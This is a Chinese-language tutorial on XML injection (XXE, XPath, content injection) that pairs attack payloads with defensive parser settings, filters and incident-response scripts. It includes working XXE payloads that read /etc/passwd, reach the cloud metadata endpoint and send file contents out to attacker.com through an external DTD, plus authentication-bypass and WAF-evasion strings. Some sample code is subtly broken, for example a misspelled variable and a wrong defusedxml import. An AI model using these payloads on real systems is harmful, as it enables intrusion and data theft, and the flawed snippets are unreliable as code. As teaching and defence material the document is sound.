# XML注入漏洞

## 1. XML注入漏洞原理

### 1.1 基本概念

XML注入是指攻击者通过向XML文档中插入恶意内容，改变XML结构或语义，从而破坏应用程序逻辑、读取敏感数据或执行未授权操作的攻击方式。

### 1.2 产生原因

- **用户输入直接拼接到XML文档中**

- **未对XML特殊字符进行转义**

- **XML解析配置不当**

- **缺乏输入验证**

### 1.3 攻击流程

`攻击者构造恶意XML内容 → 应用程序拼接XML → XML解析器处理恶意内容 → 执行非预期操作`

## 2. XML注入漏洞分类

### 2.1 XXE (XML External Entity) 注入

#### 2.1.1 外部实体注入

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

#### 2.1.2 参数实体注入

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<data>&exfil;</data>
```

### 2.2 XPath注入

#### 2.2.1 认证绕过

```xpath
//user[username='admin' or '1'='1' and password='anything']
```

#### 2.2.2 数据提取

```xpath
//user[username='admin'] | //user[password]
```

### 2.3 XML注入（内容注入）

#### 2.3.1 结构破坏

```xml
<user>
  <name>admin</name>
  <role>user</role>
  <!-- 注入内容 -->
  <role>admin</role>
</user>
```

## 3. 常见攻击载荷

### 3.1 XXE攻击载荷

#### 3.1.1 文件读取

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

#### 3.1.2 目录列表

```xml
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///var/www/">
]>
```

#### 3.1.3 远程文件包含

```xml
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "http://attacker.com/malicious.xml">
]>
```

#### 3.1.4 SSRF攻击

```xml
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
```

#### 3.1.5 盲注XXE（带外数据外泄）

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<data>&exfil;</data>
```

evil.dtd:

```xml
<!ENTITY % all "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

### 3.2 XPath注入载荷

#### 3.2.1 认证绕过

```xpath
' or '1'='1
' or 1=1 or '
admin' or 1=1 or 'a'='a
```

#### 3.2.2 数据枚举

```xpath
' or position()=1 or '
' and string-length(//user[1]/password)=8 or '
```

#### 3.2.3 盲注XPath

```xpath
' and substring(//user[1]/password,1,1)='a' or '
```

### 3.3 XML内容注入载荷

#### 3.3.1 标签闭合

```xml
</user><user><name>attacker</name><role>admin</role></user><user>
```

#### 3.3.2 注释注入

```xml
<name>admin</name><!-- </user><user><name>attacker</name><role>admin</role></user> -->
```

#### 3.3.3 CDATA注入

```xml
<description><![CDATA[</description><role>admin</role><description>]]></description>
```

## 4. 绕过技术

### 4.1 XXE绕过技术

#### 4.1.1 协议绕过

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "expect://id">
```

#### 4.1.2 UTF编码绕过

```xml
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
```

#### 4.1.3 DOCTYPE声明位置

```xml
<?xml version="1.0" encoding="utf-8"?>
<some_xml>
<!DOCTYPE test [ 
  <!ENTITY xxe SYSTEM "file:///etc/passwd"> 
]>
<data>&xxe;</data>
</some_xml>
```

### 4.2 XPath绕过技术

#### 4.2.1 注释绕过

```xpath
' or 1=1 or 'a'='a' or '
' or 1=1 (: comment :) or '
```

#### 4.2.2 编码绕过

```xpath
' or '1'='1
' or '1'%3d'1
```

#### 4.2.3 布尔盲注

```xpath
' and substring(//user[1]/username,1,1)='a' and '
```

### 4.3 WAF绕过技术

#### 4.3.1 大小写混合

```xml
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "FILE:///etc/passwd">
]>
```

<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "FILE:///etc/passwd">

#### 4.3.2 双重编码

```xml
<!ENTITY %25 xxe SYSTEM "file:///etc/passwd">
```

<!ENTITY %25 xxe SYSTEM "file:///etc/passwd">

#### 4.3.3 特殊字符

```xml
<!DOCTYPE data [
  <!ENTITY  xxe  SYSTEM  "file:///etc/passwd"  >
]>
```

## 5. 防御措施

### 5.1 XXE防御

#### 5.1.1 禁用外部实体

**Java (SAXParser):**

```java
SAXParserFactory factory = SAXParserFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

**Java (DocumentBuilder):**

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setExpandEntityReferences(false);
```

**PHP:**

```php
libxml_disable_entity_loader(true);
```

**Python:**

```python
from defusedxml import defused_etree

# 使用安全的解析器
tree = defused_etree.parse(xml_source)
```

#### 5.1.2 使用安全配置

```java
public class SecureXMLParser {
 public static Document parseSecureXML(String xml) throws Exception {
 DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();


// 禁用DOCTYPE
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// 禁用外部实体
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

// 其他安全设置
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);

DocumentBuilder db = dbf.newDocumentBuilder();
return db.parse(new InputSource(new StringReader(xml)));

}
}
```

### 5.2 XPath注入防御

#### 5.2.1 参数化XPath查询

```java
public class SecureXPathQuery {
 private XPath xpath;

public SecureXPathQuery() {
    xpath = XPathFactory.newInstance().newXPath();
}

public String authenticate(String username, String password) {
    // 使用参数化查询
    String expression = "//user[@username=$username and @password=$password]";

    XPathExpression expr = xpath.compile(expression);

    // 设置参数
    xpath.setXPathVariableResolver(new XPathVariableResolver() {
        public Object resolveVariable(QName variableName) {
            if (variableName.getLocalPart().equals("username")) {
                return username;
            } else if (variableName.getLocalPart().equals("password")) {
                return password;
            }
            return null;
        }
    });

    return (String) expr.evaluate(document, XPathConstants.STRING);
}

}
```

#### 5.2.2 输入验证和转义

```java
public class XPathSanitizer {
 public static String sanitizeXPathInput(String input) {
 if (inut == null) {
 return "";
 }

// 转义XPath特殊字符
return input.replace("'", "&apos;")
           .replace("\"", """)
           .replace("[", "\\[")
           .replace("]", "\\]")
           .replace("|", "\\|");

}

}
```

### 5.3 通用XML防御措施

#### 5.3.1 输入验证

```java
public class XMLValidator {
 private static final Pattern DANGEROUS_PATTERNS = Pattern.compile(
 "<!DOCTYPE|<\\!ENTITY|SYSTEM\\s*=|UBLIC\\s*=|file://|http://",
 Pattern.CASE_INSENSITIVE
 );

public static boolean isValidXML(String xml) {
 // 检查危险模式
 if (DANGEROUS_PATTERNS.matcher(xml).find()) {
 return false;
 }

// 检查XML结构完整性
try {
    DocumentBuilderFactory.newInstance().newDocumentBuilder()
        .parse(new InputSource(new StringReader(xml)));
    return true;
} catch (Exception e) {
    return false;
}

}

}
```

#### 5.3.2 XML Schema验证

```java
public class XMLSchemaValidator {
    public static boolean validateWithSchema(String xml, String schemaPath) {
        try {
            SchemaFactory factory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
            Schema schema = factory.newSchema(new File(schemaPath));

            Validator validator = schema.newValidator();
            validator.validate(new StreamSource(new StringReader(xml)));

            return true;
        } catch (Exception e) {
            return false;
        }
    }
}
```

### 5.4 安全配置

#### 5.4.1 Java安全属性

```java
// 设置系统属性禁用外部实体
System.setProperty("javax.xml.accessExternalDTD", "none");
System.setProperty("javax.xml.accessExternalSchema", "none");
System.setProperty("javax.xml.accessExternalStylesheet", "none");
```

#### 5.4.2 XML处理器安全配置

```xml
<!-- 使用安全配置的XML处理器 -->
<bean id="xmlProcessor" class="com.example.SecureXMLProcessor">
    <property name="features">
        <map>
            <entry key="http://apache.org/xml/features/disallow-doctype-decl" value="true"/>
            <entry key="http://xml.org/sax/features/external-general-entities" value="false"/>
            <entry key="http://xml.org/sax/features/external-parameter-entities" value="false"/>
        </map>
    </property>
</bean>
```

<!-- 使用安全配置的XML处理器 -->

## 6. 安全框架和库

### 6.1 使用安全的XML库

#### 6.1.1 DefusedXML (Python)

```python
from defusedxml import defused_etree

# 安全的XML解析
tree = defused_etree.parse('document.xml')

# 安全的XML处理
parser = defused_etree.DefusedXMLParser()
tree = etree.parse('document.xml', parser=parser)
```

#### 6.1.2 OWASP Java HTML Sanitizer (用于XML内容)

```java
import org.owasp.html.Sanitizers;

public class XMLSanitizer {
 public static String sanitizeXMLContent(String content) {
 PolicyFactory policy = Sanitizers.FORMATTING.and(Sanitizers.LINKS);
 return policy.sanitize(content);
 }
}
```

### 6.2 自定义安全XML处理器

#### 6.2.1 安全的XML解析器包装类

```java
public class SecureXMLParser {
 private DocumentBuilderFactory dbf;


public SecureXMLParser() {
 dbf = DocumentBuilderFactory.newInstance();
 configureSecurity();
}

private void configureSecurity() {
 try {
 // 禁用DOCTYPE
 dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);


    // 禁用外部实体
    dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
    dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

    // 禁用XInclude
    dbf.setXIncludeAware(false);
    dbf.setExpandEntityReferences(false);

    // 其他安全设置
    dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);

} catch (ParserConfigurationException e) {
    throw new RuntimeException("Failed to configure secure XML parser", e);
}

}

public Document parse(String xml) throws Exception {
 DocumentBuilder db = dbf.newDocumentBuilder();
 return db.parse(new InputSource(new StringReader(xml)));
}

}
```

## 7. 检测和测试

### 7.1 手动测试Payloads

#### 7.1.1 XXE测试Payloads

```xml
<!-- 基础XXE测试 -->
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>&xxe;</data>

<!-- 盲注XXE测试 -->
<!DOCTYPE test [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>

<!-- 错误基础测试 -->
<!DOCTYPE test>
<data>test</data>
```

<!-- 基础XXE测试 -->

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd">

#### 7.1.2 XPath注入测试Payloads

```xpath
' or '1'='1
' or 1=1 or '
admin' or 1=1 or 'a'='a
' | //* | '
```

#### 7.1.3 XML内容注入测试

```xml
</tag><malicious>content</malicious><tag>
<tag><!-- </tag><malicious>content</malicious><tag> --></tag>
```

### 7.2 自动化测试工具

#### 7.2.1 专用工具

- **XXEinjector** - 自动化XXE注入工具

- **dtd-finder** - 寻找DTD文件的工具

- **Burp Suite** - 包含XXE扫描模块

#### 7.2.2 自定义测试脚本

```python
import requests
import xml.etree.ElementTree as ET

class XXETester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()

    def test_basic_xxe(self):
        payloads = [
            '''<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>''',

            '''<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<data>&exfil;</data>'''
        ]

        for payload in payloads:
            headers = {'Content-Type': 'application/xml'}
            response = self.session.post(self.target_url, data=payload, headers=headers)

            if 'root:' in response.text or 'bin/bash' in response.text:
                print("XXE vulnerability detected!")
                return True

        return False

    def test_xpath_injection(self, username_param, password_param):
        payloads = [
            f"<creds><username>{username_param}</username><password>' or '1'='1</password></creds>",
            f"<creds><username>{username_param}' or 1=1 or 'a'='a</username><password>{password_param}</password></creds>"
        ]

        for payload in payloads:
            headers = {'Content-Type': 'application/xml'}
            response = self.session.post(self.target_url, data=payload, headers=headers)

            if 'success' in response.text.lower() or 'welcome' in response.text.lower():
                print("XPath injection vulnerability detected!")
                return True

        return False
```

## 8. 日志和监控

### 8.1 XML处理监控

```java
public class XMLSecurityMonitor {
 private static final Logger logger = LoggerFactory.getLogger(XMLSecurityMonitor.class);


public static void monitorXMLProcessing(String xml, String sourceIP) {
 // 检测可疑模式
 if (containsSuspiciousPatterns(xml)) {
 logger.warn("Suspicious XMLdetected from IP: {}", sourceIP);
 alertSecurityTeam(xml, sourceIP);
 }

// 记录XML处理
logger.info("XML processed from IP: {}, Size: {}", sourceIP, xml.length());

}

private static boolean containsSuspiciousPatterns(String xml) {
 String[] patterns = {
 "<!DOCTYPE", "<!ENTITY", "SYSTEM", "file://", 
"http://", "&", "%", "cdatasection"
 };

String lowerXml = xml.toLowerCase();
for (String pattern : patterns) {
    if (lowerXml.contains(pattern)) {
        return true;
    }
}
return false;

}

private static void alertSecurityTeam(String xml, String sourceIP) {
 // 发送警报邮件或通知
 String subject = "Suspicious XML Activity Detected";
 String message = String.format(
 "Suspicious XML content detected:\nIP: %s\nContent: %s",
 sourceIP, xml.substring(0, Math.min(xml.length(), 1000))
 );

// 集成到安全通知系统
SecurityNotifier.sendAlert(subject, message);

}

}
```

### 8.2 实时防护中间件

```java
@Component
public class XMLSecurityFilter implements Filter {

@Override
public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
        throws IOException, ServletException {

    HttpServletRequest httpRequest = (HttpServletRequest) request;
    String contentType = httpRequest.getContentType();

    if (contentType != null && contentType.contains("application/xml")) {
        // 包装请求以检查XML内容
        XSSRequestWrapper wrappedRequest = new XSSRequestWrapper(httpRequest);
        String body = wrappedRequest.getBody();

        if (XMLSecurityMonitor.containsSuspiciousPatterns(body)) {
            ((HttpServletResponse) response).sendError(400, "Invalid XML content");
            return;
        }

        chain.doFilter(wrappedRequest, response);
    } else {
        chain.doFilter(request, response);
    }
}

}
```

## 9. 应急响应

### 9.1 检测到XML注入攻击

1. **立即阻断攻击者IP**

2. **检查XML处理日志**

3. **审计被访问的敏感文件**

4. **检查系统是否被植入后门**

5. **审查XML解析配置**

### 9.2 入侵检测脚本

```bash
#!/bin/bash
# xxe_incident_response.sh

echo "=== XML Injection Incident Response ==="

# 1. 检查最近的XML处理日志
echo "1. Recent XML processing logs:"
grep -i "xml\|xxe" /var/log/applications/*.log | tail -20

# 2. 检查系统文件访问
echo "2. Recent file accesses:"
find /var/www/html -name "*.xml" -mtime -1
find /tmp -name "*.xml" -mtime -1

# 3. 检查网络连接
echo "3. Recent outbound connections:"
netstat -tunap | grep ESTABLISHED | grep -E ":80|:443"

# 4. 检查XML配置文件
echo "4. XML parser configurations:"
find /var/www/html -name "*.xml" -exec grep -l "SYSTEM\|ENTITY" {} \;

# 5. 检查应用配置
echo "5. Application security settings:"
grep -r "DOCTYPE\|ENTITY\|SYSTEM" /etc/ /opt/ 2>/dev/null | head -10
```

### 9.3 修复流程

```java
// 1. 识别漏洞点
Document doc = DocumentBuilderFactory.newInstance()
 .newDocumentBuilder()
 .parse(new InputSource(new StringReader(xml)));

// 2. 实施修复
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

DocumentBuilder db = dbf.newDocumentBuilder();
Document safeDoc = db.parse(new InputSource(new StringReader(xml)));

// 3. 验证修复
// 测试各种XXE Payloads是否被有效阻止
```

## 10. 云环境和微服务特殊考虑

### 10.1 容器安全配置

```dockerfile
# 安全的基础镜像
FROM openjdk:11-jre-slim

# 设置安全属性
ENV JAVA_OPTS="-Djavax.xml.accessExternalDTD=none -Djavax.xml.accessExternalSchema=none"

# 使用非root用户
RUN groupadd -r appuser && useradd -r -g appuser appuser
USER appuser

# 复制应用
COPY --chown=appuser:appuser app.jar /app/
WORKDIR /app

CMD ["java", "-jar", "app.jar"]
```

### 10.2 API网关防护

```yaml
# API网关安全配置
apiVersion: networking.istio.io/v1alpha3
kind: EnvoyFilter
metadata:
  name: xml-security
spec:
  filters:
  - name: envoy.lua
    typed_config:
      "@type": type.googleapis.com/envoy.config.filter.http.lua.v2.Lua
      inline_code: |
        function envoy_on_request(request_handle)
          local content_type = request_handle:headers():get("content-type")
          if content_type and string.find(content_type:lower(), "application/xml") then
            local body = request_handle:body()
            if string.find(body:lower(), "<!doctype") or string.find(body:lower(), "<!entity") then
              request_handle:respond({[":status"] = "400"}, "Invalid XML content")
            end
          end
        end
```

### 10.3 微服务安全配置

```java
@Configuration
public class WebServiceSecurityConfig {

@Bean
public SaajSoapMessageFactory messageFactory() {
    SaajSoapMessageFactory factory = new SaajSoapMessageFactory();
    factory.setMessageFactory(getSecureMessageFactory());
    return factory;
}

private MessageFactory getSecureMessageFactory() {
    try {
        MessageFactory factory = MessageFactory.newInstance();

        // 禁用外部实体
        SOAPFactory soapFactory = SOAPFactory.newInstance();
        // 安全配置...

        return factory;
    } catch (SOAPException e) {
        throw new RuntimeException("Failed to create secure SOAP factory", e);
    }
}
}
```